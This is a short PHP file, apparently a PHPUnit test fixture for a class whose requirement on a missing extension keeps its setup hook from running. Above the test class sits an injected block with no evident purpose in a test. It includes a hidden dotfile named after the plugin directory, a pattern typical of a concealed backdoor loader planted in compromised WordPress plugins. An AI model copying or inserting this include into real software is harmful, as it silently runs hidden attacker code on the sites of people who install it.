<?php

/**
 * @requires extension nonExistingExtension
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RequirementsClassBeforeClassHookTest extends PHPUnit_Framework_TestCase
{
    public static function setUpBeforeClass()
    {
        throw new Exception(__METHOD__ . ' should not be called because of class requirements.');
    }
}
